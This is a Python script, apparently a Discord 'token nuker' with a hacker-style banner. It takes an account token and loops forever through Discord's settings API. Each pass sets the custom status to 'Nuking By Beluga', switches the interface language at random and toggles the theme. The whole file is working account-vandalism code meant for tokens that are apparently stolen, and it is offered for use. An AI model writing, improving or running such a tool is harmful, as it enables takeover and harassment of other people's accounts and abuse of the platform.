from pystyle import Center, Colorate, Colors, Anime
import colorama
import os
import requests
import time
import random
from itertools import cycle

os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan,"""
▄▄▄▄  ▄▄▄  ▄▄▄▄                                 
▀███  ███  ███▀                                 
 ███  ███  ███ ██ ██ ███▄███▄ ████▄ ██ ██ ▄█▀▀▀ 
 ███▄▄███▄▄███ ██ ██ ██ ██ ██ ██ ██ ██ ██ ▀███▄ 
  ▀████▀████▀  ▀██▀█ ██ ██ ██ ████▀ ▀██▀█ ▄▄▄█▀ 
                              ██                
                              ▀▀                

                ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                ┃ Author : Wumpus             ┃
                ┃ Discord: .gg/datas          ┃
                ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
"""))

colorama.init(autoreset=True)

def ErrorToken():
    print(colorama.Fore.RED + "Invalid Token.")
    exit()

def ErrorChoice():
    print(colorama.Fore.RED + "Invalid Choice.")
    exit()

def TokenNuker(token, custom_status_input):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if response.status_code != 200:
        ErrorToken()

    default_status = f"Nuking By Beluga"
    custom_status = f"{custom_status_input} | Beluga"

    modes = cycle(["light", "dark"])

    while True:
        CustomStatus_default = {"custom_status": {"text": default_status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_default)
            print(colorama.Fore.GREEN + f"Status Changed to: {default_status}")
        except Exception as e:
            print(colorama.Fore.RED + f"Error changing status to {default_status}: {e}")

        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(colorama.Fore.GREEN + f"Language changed to: {random_language}")
            except:
                print(colorama.Fore.RED + f"Error changing language to {random_language}")
        
            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(colorama.Fore.GREEN + f"Theme changed to: {theme}")
            except:
                print(colorama.Fore.RED + f"Error changing theme to {theme}")
            time.sleep(0.5)

        CustomStatus_custom = {"custom_status": {"text": custom_status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_custom)
            print(colorama.Fore.GREEN + f"Status Changed to: {custom_status}")
        except Exception as e:
            print(colorama.Fore.RED + f"Error changing status to {custom_status}: {e}")
        
        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(colorama.Fore.GREEN + f"Language changed to: {random_language}")
            except:
                print(colorama.Fore.RED + f"Error changing language to {random_language}")
        
            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(colorama.Fore.GREEN + f"Theme changed to: {theme}")
            except:
                print(colorama.Fore.RED + f"Error changing theme to {theme}")
            time.sleep(0.5)

try:
    token = input("Enter your token: ")
    custom_status_input = input("Enter custom status: ")
    TokenNuker(token, custom_status_input)

except Exception as e:
    print(colorama.Fore.RED + f"Error: {e}")
